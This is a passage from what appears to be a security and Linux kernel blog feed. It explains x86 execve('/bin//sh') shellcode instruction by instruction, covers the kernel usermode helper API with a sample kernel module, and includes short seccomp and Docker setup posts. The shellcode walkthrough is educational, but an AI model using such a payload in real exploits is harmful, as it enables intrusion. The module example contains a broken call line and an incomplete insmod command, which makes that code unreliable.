<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"\x31\xc0"</span>             <span class="comment">/* xorl    %eax,%eax              */</span></span><br><span class="line"><span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br></pre></td></tr></table></figure>

<p>At first, we make the <code>%eax</code> register to <code>zero</code> by do <em>xor</em> option with itself. The reason why we don&#39;t use <code>move zero</code> is that we can&#39;t <code>strcpy</code> the string after the value <code>\0</code>. Then we push it into the stack.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"\x68"</span><span class="string">"//sh"</span>           <span class="comment">/* pushl   $0x68732f2f            */</span></span><br><span class="line"><span class="string">"\x68"</span><span class="string">"/bin"</span>           <span class="comment">/* pushl   $0x6e69622f            */</span></span><br></pre></td></tr></table></figure>

<p>Next, we push the string value to the stack, notice the line 1, we actually push the string <code>&quot;//sh&quot;</code>, this is because we have to align the memory space, and fortunately when run the shell code, <code>&quot;//sh&quot;</code> is equal to <code>&quot;/sh&quot;</code>.</p>
<p>Another point we should notice is that now the <em>stack pointer</em> which stores in the <code>%esp</code> register points to the start address of the String <code>/bin//sh</code>.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"\x89\xe3"</span>             <span class="comment">/* movl    %esp,%ebx              */</span></span><br></pre></td></tr></table></figure>

<p>Now, the register store the start address of <code>&quot;/bin//sh&quot;</code>, which can not decide in compile time.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"\x50"</span>                 <span class="comment">/* pushl   %eax                   */</span></span><br><span class="line">	<span class="string">"\x53"</span>                 <span class="comment">/* pushl   %ebx                   */</span></span><br><span class="line"><span class="string">"\x89\xe1"</span>             <span class="comment">/* movl    %esp,%ecx              */</span></span><br></pre></td></tr></table></figure>

<p>These lines actually form the stack like this:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addr+0		0</span><br><span class="line">addr+4		&#x2F;&#x2F;sh</span><br><span class="line">addr+8		&#x2F;bin		&lt;- %ebx &#x3D; addr+8</span><br><span class="line">addr+12		0</span><br><span class="line">addr+16		addr+8		&lt;- %esp &#x3D; addr+16</span><br></pre></td></tr></table></figure>

<p>So when we move <code>%esp</code> to <code>%ecx</code>, we actually form the value <code>argv[]</code>, where <code>argv[0]</code> contain the start address of <code>&quot;/bin//sh&quot;</code>, and <code>argv[1]</code> is <code>zero</code>.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"\x99"</span>                 <span class="comment">/* cdq                            */</span></span><br></pre></td></tr></table></figure>

<p>This instruction put <code>zero</code> into <code>%edx</code>.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;\xb0\x0b&quot;             &#x2F;* movb    $0x0b,%al              *&#x2F;</span><br><span class="line">&quot;\xcd\x80&quot;             &#x2F;* int     $0x80                  *&#x2F;</span><br></pre></td></tr></table></figure>

<p><code>0x0b</code> means the No.11 entry in the system call table, which is the <code>execve</code> function. The line 2 call the system call. These two line triggers the <code>execve</code> system call.</p>
]]></content>
      <categories>
        <category>Attack</category>
      </categories>
      <tags>
        <tag>stack overflow</tag>
        <tag>function</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Usermode Helper API</title>
    <url>/2019/06/27/linux-usermodehelper/</url>
    <content><![CDATA[<p>Linux Usermode API, is a kind of feature in Linux kernel that can be used by kernel code to call user-space code in runtime.</p>
<p>Here are few instructions about it and they are mainly about <strong>what usermode helper is</strong> and <strong>how do kernel uses it</strong>.</p>
<a id="more"></a>

<h2 id="Kernel-Version"><a href="#Kernel-Version" class="headerlink" title="Kernel Version"></a>Kernel Version</h2><p><strong>I use the latest Linux kernel code which is version 5.4</strong>, and I notice that the usermode helper code has been moved from <code>/kernel/kmod.c</code> to <code>/kenerl/umh.c</code>. I believe this is the work done by the Linux contributor to make code easier to understand, and probably there will be no change of this code from now on.</p>
<h2 id="Related-Resources"><a href="#Related-Resources" class="headerlink" title="Related Resources"></a>Related Resources</h2><p>There actually exist some articles about what is usermode helper and how to do within it.</p>
<p>The IBM Developer provides a <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuaWJtLmNvbS9hcnRpY2xlcy9sLXVzZXItc3BhY2UtYXBwcy8=" title="https://developer.ibm.com/articles/l-user-space-apps/">good introduction<i class="fa fa-external-link"></i></span> to the usermode helper. However some functions of usermode helper code in this article are out of date, so I will reintroduce them systematically in this essay. <span class="exturl" data-url="aHR0cHM6Ly9pbnN1amFuZy5naXRodWIuaW8vYWJvdXQv" title="https://insujang.github.io/about/">Insu Jang<i class="fa fa-external-link"></i></span> provides <span class="exturl" data-url="aHR0cHM6Ly9pbnN1amFuZy5naXRodWIuaW8vMjAxNy0wNS0xMC91c2VybW9kZS1oZWxwZXItYXBpLw==" title="https://insujang.github.io/2017-05-10/usermode-helper-api/">an article<i class="fa fa-external-link"></i></span> about how to use usermode API which gives me a good example, but I think there are still some detail instructions to explain, so the rest part of my article will complete them.</p>
<h2 id="What-is-usermode-helper"><a href="#What-is-usermode-helper" class="headerlink" title="What is usermode helper"></a>What is usermode helper</h2><p>Remember I mentioned before, <strong>usermode helper</strong> is used to call user space code, which means the kernel can execute the user space binary if we have passed the valid information the the API.</p>
<p>Here are the <strong>disclaimer</strong> provided by M. Jones in &quot;Invoking user-space applications from the kernel&quot;.</p>
<blockquote>
<p>This method provides a necessary function for invoking user-space applications from the kernel. Although there are legitimate uses for this functionality, you should strongly consider whether other implementations are needed. This is one approach, but other approaches are better suited.</p>
</blockquote>
<p>Remember not abuse this method for it brings a lot of vulnerabilities into the kernel, if you are interested in how it affects the kernel security, take a look at <a href="https://tianyuzhou.top/2019/10/18/cgroups-escape/#case-1-exception-handling">this page</a>.</p>
<p>The Basic data structure in usermode helper executing cycle is <a href="https://elixir.bootlin.com/linux/v5.4/source/include/linux/umh.h#L19" target="_blank" rel="noopener"><code>subprocess_info</code></a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *path;             <span class="comment">// path to usermode executable</span></span><br><span class="line">    <span class="keyword">char</span> **argv;                  <span class="comment">// arg vector for process</span></span><br><span class="line">    <span class="keyword">char</span> **envp;                  <span class="comment">// environment for process</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">int</span> wait;</span><br><span class="line">    <span class="keyword">int</span> retval;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">    <span class="keyword">void</span> *data;                   <span class="comment">// arbitrary context sensitive data</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In <code>/kernel/umh.c</code> file there are bunch of functions aiming at dealing usermode helper. The function initializes the <code>subprocess_info</code> is <code>call_usermodehelper_setup()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct subprocess_info *<span class="title">call_usermodehelper_setup</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> **argv,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">char</span> **envp, <span class="keyword">gfp_t</span> gfp_mask,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>),</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">void</span> (*cleanup)(struct subprocess_info *info),</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">void</span> *data)</span></span></span><br></pre></td></tr></table></figure>

<p>This function return either the <code>subprocess_info</code> or the <code>NULL</code> for allocation failure, and the <code>subprocess_info</code> will be sent to the function <code>call_usermodehelper_exec()</code> to exec the process and free the structure. In this function both <code>subprocess_info.init()</code> and <code>subprocess_info.clean()</code> is defined to create and clean the subprocess.</p>
<p>There exist two ways to use usermode helper</p>
<ul>
<li>call <code>call_usermodehelper_setup()</code> and <code>call_usermodehelper_exec()</code></li>
<li>call <code>call_usermodehelper()</code></li>
</ul>
<p>And if you want more detail core function information, please goto the source <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvdjUuNC9zb3VyY2Uva2VybmVsL3VtaC5j" title="https://elixir.bootlin.com/linux/v5.4/source/kernel/umh.c">code file<i class="fa fa-external-link"></i></span> for deep understanding.</p>
<h2 id="How-to-use-usermode-helper"><a href="#How-to-use-usermode-helper" class="headerlink" title="How to use usermode helper"></a>How to use usermode helper</h2><p>There actually no way to call usermode helper in user space, for this feature is only provided to kernel.</p>
<p>In kernel space, if you want to use usermode helper inside your code, simply include <code>&lt;linux/umh.h&gt;</code> will work. You can choose one of the methods described above to call usermode helper, remember to pass the correct parameters.</p>
<p>For example you can install a kernel module with calling usermode helper inside it.</p>
<p>Here is a simple example of writing Linux loadable kernel module containing usermode helper.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// lkm-usrmodehelper.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seq_file.h&gt;</span></span></span><br><span class="line"><span class="comment">// for usermode helper</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kmod.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermode_helper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">"/usr/bin/logger"</span>, <span class="string">"message from kernel device driver"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span>* envp[] = &#123;</span><br><span class="line">        <span class="string">"HOME=/"</span>,</span><br><span class="line">        <span class="string">"TERM=linux"</span>,</span><br><span class="line">        <span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_proc_show</span><span class="params">(struct seq_file *m, <span class="keyword">void</span> *v)</span> </span>&#123;</span><br><span class="line">    call_usermode_helper</span><br><span class="line">	seq_printf(m, <span class="string">"Hello proc!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_proc_open</span><span class="params">(struct inode *inode, struct  file *file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> single_open(file, hello_proc_show, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">hello_proc_fops</span> = &#123;</span> </span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .<span class="built_in">open</span> = hello_proc_open,</span><br><span class="line">    .<span class="built_in">read</span> = seq_read,</span><br><span class="line">    .llseek = seq_lseek,</span><br><span class="line">    .<span class="built_in">release</span> = single_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">hello_proc_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    proc_create(<span class="string">"hello_proc"</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;hello_proc_fops);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">hello_proc_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    remove_proc_entry(<span class="string">"hello_proc"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">module_init(hello_proc_init);</span><br><span class="line">module_exit(hello_proc_exit);</span><br></pre></td></tr></table></figure>

<p>Then write a <code>Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += lkm-usrmodehelper.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">  make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">  make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>Then exec these commands in the terminal</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ sudo insmod lkm-usrmodehelper</span><br><span class="line">$ cat /proc/hello_proc</span><br><span class="line">Hello proc!</span><br><span class="line">$ cat /var/<span class="built_in">log</span>/syslog | grep <span class="string">"message from"</span></span><br><span class="line">Nov 28 13:17:45 xxx root: message from kernel device driver</span><br><span class="line">$ sudo rmmod lkm-usrmodehelper <span class="comment"># remove lkm</span></span><br></pre></td></tr></table></figure>

<h2 id="How-many-caller-in-kernel-5-4"><a href="#How-many-caller-in-kernel-5-4" class="headerlink" title="How many caller in kernel (5.4)"></a>How many caller in kernel (5.4)</h2><p>The kernel I use is the Linux 5.4, up to now, there are many caller of usermode helper in both ways I have mentioned before.</p>
<h3 id="Machine-check-Exception"><a href="#Machine-check-Exception" class="headerlink" title="Machine-check Exception"></a>Machine-check Exception</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arch&#x2F;x86&#x2F;kernel&#x2F;cpu&#x2F;mce&#x2F;dev-mcelog.c, line 80</span><br></pre></td></tr></table></figure>

<p>Machine-check exception (MCE) is a type of computer hardware error that occurs when a computer&#39;s central processing unit detects an unrecoverable hardware error in the processor itself, the memory, the i/o devices or the system bus. More info refer to <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWFjaGluZS1jaGVja19leGNlcHRpb24=" title="https://en.wikipedia.org/wiki/Machine-check_exception">Wiki<i class="fa fa-external-link"></i></span>.</p>
<p>This is called when there is a MCE occurs (in my personal view, maybe incorrect). The caller is inside a struct <code>notifier_block</code> defined in <code>arch/x86/kernel/cpu/mce/core.c</code>.</p>
<h3 id="Plug-and-Play-PnP-BIOS"><a href="#Plug-and-Play-PnP-BIOS" class="headerlink" title="Plug and Play (PnP) BIOS"></a>Plug and Play (PnP) BIOS</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drivers&#x2F;pnp&#x2F;pnpbios&#x2F;core.c, line 130</span><br></pre></td></tr></table></figure>

<p><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvRG9jdW1lbnRhdGlvbi9wbnAudHh0" title="https://www.kernel.org/doc/Documentation/pnp.txt">Plug and Play<i class="fa fa-external-link"></i></span> provides a means of detecting and setting resources for legacy or otherwise unconfigurable devices.  The Linux Plug and Play Layer provides these services to compatible drivers.</p>
<p>In <code>drivers/pnp/pnpbios/core.c</code> file, the <a href="https://elixir.bootlin.com/linux/v5.4/source/drivers/pnp/pnpbios/core.c#L570" target="_blank" rel="noopener"><code>__init pnpbios_thread_init(void)</code></a> function runs a kernel thread called <em>kpnpbiosd</em>, which keeps doing function <a href="https://elixir.bootlin.com/linux/v5.4/source/drivers/pnp/pnpbios/core.c#L139" target="_blank" rel="noopener"><code>pnp_dock_thread()</code></a>, there exist a path to call usermode helper inside the <code>pnp_docker_thread()</code> function.</p>
<ul>
<li>So maybe use some tricks to communicate with <em>kpnpbiosd</em> kernel thread, can trigger this usermode helper caller, it seems that it depends on the status of the pnp docking</li>
</ul>
<h3 id="Distributed-Replicated-Block-Device"><a href="#Distributed-Replicated-Block-Device" class="headerlink" title="Distributed Replicated Block Device"></a>Distributed Replicated Block Device</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drivers&#x2F;block&#x2F;drbd&#x2F;drbd_nl.c</span><br><span class="line">	line 384</span><br><span class="line">	line 426</span><br></pre></td></tr></table></figure>

<p><a href="https://en.wikipedia.org/wiki/Distributed_Replicated_Block_Device" target="_blank" rel="noopener"><strong>DRBD</strong></a> is a distributed replicated storage system for the <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTGludXg=" title="https://en.wikipedia.org/wiki/Linux">Linux<i class="fa fa-external-link"></i></span> platform. It is implemented as a kernel driver, several <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVXNlcnNwYWNl" title="https://en.wikipedia.org/wiki/Userspace">userspace<i class="fa fa-external-link"></i></span> management applications, and some <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2hlbGxfc2NyaXB0cw==" title="https://en.wikipedia.org/wiki/Shell_scripts">shell scripts<i class="fa fa-external-link"></i></span>. DRBD is traditionally used in <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvSGlnaF9hdmFpbGFiaWxpdHk=" title="https://en.wikipedia.org/wiki/High_availability">high availability<i class="fa fa-external-link"></i></span> (HA) <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ29tcHV0ZXJfY2x1c3Rlcg==" title="https://en.wikipedia.org/wiki/Computer_cluster">computer clusters<i class="fa fa-external-link"></i></span>, but beginning with DRBD version 9, it can also be used to create larger software defined storage pools with a focus on cloud integration.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">drivers&#x2F;block&#x2F;drbd&#x2F;drbd_nl.c</span><br><span class="line">	line 384</span><br><span class="line">	line 426</span><br><span class="line">drivers&#x2F;greybus&#x2F;svc_watchdog.c, line 60</span><br><span class="line">drivers&#x2F;macintosh&#x2F;windfarm_core.c, line 83</span><br><span class="line">drivers&#x2F;net&#x2F;hamradio&#x2F;baycom_epp.c, line 312</span><br><span class="line"></span><br><span class="line">drivers&#x2F;staging&#x2F;rtl8192e&#x2F;rtl8192e&#x2F;rtl_dm.c</span><br><span class="line">	line 278</span><br><span class="line">	line 1845</span><br><span class="line">drivers&#x2F;video&#x2F;fbdev&#x2F;uvesafb.c, line 125</span><br><span class="line">fs&#x2F;nfs&#x2F;cache_lib.c, line 52</span><br><span class="line">fs&#x2F;nfsd&#x2F;nfs4layouts.c, line 632</span><br><span class="line">fs&#x2F;nfsd&#x2F;nfs4recover.c, line 1833</span><br><span class="line">fs&#x2F;ocfs2&#x2F;stackglue.c, line 434</span><br><span class="line">include&#x2F;linux&#x2F;umh.h, line 35</span><br><span class="line">kernel&#x2F;cgroup&#x2F;cgroup-v1.c, line 805</span><br><span class="line">kernel&#x2F;reboot.c, line 433</span><br><span class="line">kernel&#x2F;umh.c</span><br><span class="line">	line 618</span><br><span class="line">	line 630</span><br><span class="line">net&#x2F;bridge&#x2F;br_stp_if.c, line 135</span><br><span class="line">security&#x2F;tomoyo&#x2F;load_policy.c, line 106</span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fs&#x2F;coredump.c, line 681</span><br><span class="line">include&#x2F;linux&#x2F;umh.h, line 38</span><br><span class="line">init&#x2F;do_mounts_initrd.c, line 83</span><br><span class="line">kernel&#x2F;kmod.c, line 94</span><br><span class="line">kernel&#x2F;umh.c</span><br><span class="line">	line 379</span><br><span class="line">	line 406</span><br><span class="line">	line 623</span><br><span class="line">lib&#x2F;kobject_uevent.c, line 613</span><br><span class="line">security&#x2F;keys&#x2F;request_key.c, line 101</span><br></pre></td></tr></table></figure>











































]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>linux kernel</tag>
        <tag>usermode helper</tag>
      </tags>
  </entry>
  <entry>
    <title>seccomp</title>
    <url>/2019/06/04/seccomp/</url>
    <content><![CDATA[<p>本文档对于Linux下的<code>seccomp</code>内核安全机制做了简要的研究，通过编写一个简单的syscall程序并运用seccomp将该syscall拦截，能够较为生动的描述seccomp的一些运作方式，同时对于Linux的系统调用有了进一步的理解。</p>
<a id="more"></a>

<h2 id="Seccomp-hand-on-try"><a href="#Seccomp-hand-on-try" class="headerlink" title="Seccomp hand-on try"></a>Seccomp hand-on try</h2><p>Written by Tianyu from ZJU.</p>
<p>2019-6-4</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><span class="exturl" data-url="aHR0cHM6Ly92ZXJpdGFzNTAxLnNwYWNlLzIwMTgvMDUvMDUvc2VjY29tcOWtpuS5oOeslOiusC8=" title="https://veritas501.space/2018/05/05/seccomp学习笔记/">seccomp学习笔记<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NpY2EwY2ljYS9hcnRpY2xlL2RldGFpbHMvNDczNTkyMzM=" title="https://blog.csdn.net/cica0cica/article/details/47359233">linux下man时括号里的数字意义<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW4yL3NlY2NvbXAuMi5odG1s" title="http://man7.org/linux/man-pages/man2/seccomp.2.html">seccomp(2) - Linux man<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW4yL2V4ZWN2ZS4yLmh0bWw=" title="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2) - Linux man<i class="fa fa-external-link"></i></span> </p>
<p><span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW4yL3dyaXRlLjIuaHRtbA==" title="http://man7.org/linux/man-pages/man2/write.2.html">write(2) - Linux man<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW4yL3N5c2NhbGwuMi5odG1s" title="http://man7.org/linux/man-pages/man2/syscall.2.html">syscall(2) - Linux man<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Zpc2hlcl9qaWFuZy9hcnRpY2xlL2RldGFpbHMvNTYwODM5OQ==" title="https://blog.csdn.net/fisher_jiang/article/details/5608399">execve的使用方法<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL2dpdHl1YW4uY29tLzIwMTYvMDUvMjEvc3lzY2FsbC8=" title="http://gityuan.com/2016/05/21/syscall/">Linux系统调用(syscall)原理<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9maWxpcHBvLmlvL2xpbnV4LXN5c2NhbGwtdGFibGUv" title="https://filippo.io/linux-syscall-table/">Searchable Linux Syscall Table for x86 and x86_64<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL21hbnBhZ2VzLnVidW50dS5jb20vbWFucGFnZXMvYmlvbmljL2VuL21hbjIvc2VjY29tcC4yLmh0bWw=" title="http://manpages.ubuntu.com/manpages/bionic/en/man2/seccomp.2.html">seccomp - ubuntu 18.04 LTS manuals<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>system call</tag>
        <tag>seccomp</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker Install</title>
    <url>/2019/03/06/docker-install/</url>
    <content><![CDATA[<h4 id="Docker的安装主要参照Docker官网的教程"><a href="#Docker的安装主要参照Docker官网的教程" class="headerlink" title="Docker的安装主要参照Docker官网的教程"></a>Docker的安装主要参照Docker官网的教程</h4><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vaW5zdGFsbC9saW51eC9kb2NrZXItY2UvdWJ1bnR1Lw==" title="https://docs.docker.com/install/linux/docker-ce/ubuntu/">Ubuntu<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vaW5zdGFsbC9saW51eC9kb2NrZXItY2UvY2VudG9zLw==" title="https://docs.docker.com/install/linux/docker-ce/centos/">CentOS<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZG9ja2VyLWZvci1tYWMvaW5zdGFsbC8=" title="https://docs.docker.com/docker-for-mac/install/">MacOS<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vZG9ja2VyLWZvci13aW5kb3dzLw==" title="https://docs.docker.com/docker-for-windows/">Windows<i class="fa fa-external-link"></i></span></li>
</ul>
<p>注意可能在安装的过程当中需要翻墙</p>
<a id="more"></a>

<h4 id="在安装完成之后，运行"><a href="#在安装完成之后，运行" class="headerlink" title="在安装完成之后，运行"></a>在安装完成之后，运行</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo docker run hello-world</span></span><br></pre></td></tr></table></figure>



<h4 id="安装的过程当中需要注意的点"><a href="#安装的过程当中需要注意的点" class="headerlink" title="安装的过程当中需要注意的点"></a>安装的过程当中需要注意的点</h4><h5 id="1-用户权限"><a href="#1-用户权限" class="headerlink" title="1. 用户权限"></a>1. 用户权限</h5><p>通过运行以下语句，可以将当前的用户添加进可以运行<strong>docker</strong>的用户当中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo groupadd docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo gpasswd -a <span class="variable">$&#123;USER&#125;</span> docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart docker</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> reboot</span></span><br></pre></td></tr></table></figure>

<h5 id="2-国内镜像设置"><a href="#2-国内镜像设置" class="headerlink" title="2. 国内镜像设置"></a>2. 国内镜像设置</h5><p>参照<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h4YjI0OS9hcnRpY2xlL2RldGFpbHMvNzk0Njk1MzQ=" title="https://blog.csdn.net/xxb249/article/details/79469534">docker构建国内镜像服务<i class="fa fa-external-link"></i></span></p>
<p>笔者采用的是阿里云。如果翻墙速度较快的话，用<strong>docker</strong>官方的仓库也行。</p>
<h5 id="3-代理服务器设置"><a href="#3-代理服务器设置" class="headerlink" title="3. 代理服务器设置"></a>3. 代理服务器设置</h5><p>如果是翻墙的情况下，可能在<strong>docker</strong>的配置当中需要设置代理服务器，根据你目前的代理设置进行操作。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo -i</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir -p /etc/systemd/system/docker.service.d</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat &gt; /etc/systemd/system/docker.service.d/http-proxy.conf &lt;&lt;EOF</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> [Service]</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> Environment=<span class="string">"HTTP_PROXY=http://proxy.example.com:80/"</span> <span class="string">"HTTPS_PROXY=https://proxy.example.com:443/"</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> EOF</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl daemon-reload</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl restart docker</span></span><br></pre></td></tr></table></figure>



<h4 id="Docker的一些学习资料"><a href="#Docker的一些学习资料" class="headerlink" title="Docker的一些学习资料"></a>Docker的一些学习资料</h4><ul>
<li><span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2Uv" title="https://yeasy.gitbooks.io/docker_practice/">Docker——从入门到实践<i class="fa fa-external-link"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cudzNjc2Nob29sLmNuL2RvY2tlci8=" title="https://www.w3cschool.cn/docker/">Docker教程<i class="fa fa-external-link"></i></span></li>
